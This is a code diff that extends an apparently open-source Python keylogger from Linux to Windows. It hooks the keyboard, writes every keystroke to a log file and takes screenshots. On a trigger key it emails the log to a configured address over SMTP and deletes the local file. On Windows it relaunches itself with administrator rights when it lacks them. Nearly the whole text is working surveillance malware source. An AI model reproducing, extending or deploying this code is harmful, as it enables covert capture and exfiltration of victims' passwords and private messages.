@@ -15,18 +15,37 @@
 #    You should have received a copy of the GNU General Public License
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>
 
-import pyxhook
-import datetime,os,sys
-import argparse as args
-import smtplib
-from time import *
-import pyscreenshot as ImageGrab
-from email.MIMEMultipart import MIMEMultipart
-from email.MIMEBase import MIMEBase
-from email.MIMEText import MIMEText
-from email.mime.image import MIMEImage
-from email import Encoders
-from email.Utils import COMMASPACE, formatdate
+import platform
+system = platform.system()
+if system == "Linux" or  system == "linux":
+
+  import pyxhook
+  import datetime,os,sys,platform
+  import argparse as args
+  import smtplib
+  from time import *
+  import pyscreenshot as ImageGrab
+  from email.MIMEMultipart import MIMEMultipart
+  from email.MIMEBase import MIMEBase
+  from email.MIMEText import MIMEText
+  from email.mime.image import MIMEImage
+  from email import Encoders
+  from email.Utils import COMMASPACE, formatdate
+
+else:
+  import pythoncom,logging
+  import pyWinhook as pyHook
+  import datetime,os,sys,platform
+  import argparse as args
+  import smtplib
+  from time import *
+  import pyscreenshot as ImageGrab
+  from email.MIMEMultipart import MIMEMultipart
+  from email.MIMEBase import MIMEBase
+  from email.MIMEText import MIMEText
+  from email.mime.image import MIMEImage
+  from email import Encoders
+  from email.Utils import COMMASPACE, formatdate  
 
 #arguments
 parser = args.ArgumentParser()
@@ -37,6 +56,7 @@ parser.add_argument("-t", "--time",required=False,type=int,default=60,help="is t
 
 parsed_args = parser.parse_args()
 
+#declaration of vars
 
 data_hora = datetime.datetime.now()
 data_hora = str(data_hora).split('.')[0].replace(' ','_')###
@@ -131,22 +151,73 @@ def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
 
 try:
 
-  def OnKeyPress(event): #essa função pega as teclas que foram precionadas
-    fob=open(log_file,'a')
-    fob.write(event.Key)
-    fob.write('\n')
+  if system == "Linux" or  system == "linux":
+    def OnKeyPress(event): #essa função pega as teclas que foram precionadas
+      fob=open(log_file,'a')
+      fob.write(event.Key)
+      fob.write('\n')
 
-    if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
-      fob.close()
-      new_hook.cancel()
-      send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-      os.remove(log_file)
+      if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
+        fob.close()
+        new_hook.cancel()
+        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+        os.remove(log_file)
 
-  new_hook = pyxhook.HookManager()
-  new_hook.KeyDown= OnKeyPress
-  new_hook.Key = OnKeyPress
-  new_hook.HookKeyboard()
-  new_hook.start()
-  screenshot()
+    new_hook = pyxhook.HookManager()
+    new_hook.KeyDown= OnKeyPress
+    new_hook.Key = OnKeyPress
+    new_hook.HookKeyboard()
+    new_hook.start()
+    screenshot()
+
+  elif system == "Windows":
+    import ctypes, sys
+
+    def is_admin():
+      try:
+          return ctypes.windll.shell32.IsUserAnAdmin()
+      except:
+          return False
+
+    if is_admin():
+      def OnKeyboardEvent(event):
+        fob=open(log_file,"a")
+        fob.write(event.Key)
+        fob.write("\n")
+
+        if event.Ascii==59:
+          fob.close
+          hooks_manager.disconnect()
+          send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+          os.remove(log_file)        
+
+      hooks_manager = pyHook.HookManager()
+      hooks_manager.KeyDown = OnKeyboardEvent
+      hooks_manager.HookKeyboard()
+      pythoncom.PumpMessages()  
+      screenshot()
+
+      # Code of your program here
+    else:
+      # Re-run the program with admin rights
+      ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None,1)
+      
+      def OnKeyboardEvent(event):
+        fob=open(log_file,"a")
+        fob.write(event.Key)
+        fob.write("\n")
+
+        if event.Ascii==59:
+          fob.close
+          hooks_manager.disconnect()
+          send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+          os.remove(log_file)
+
+      hooks_manager = pyHook.HookManager()
+      hooks_manager.KeyDown = OnKeyboardEvent
+      hooks_manager.HookKeyboard()
+      pythoncom.PumpMessages()  
+      screenshot()      
+    
 except(KeyboardInterrupt):
   print("Sorry Not Day")
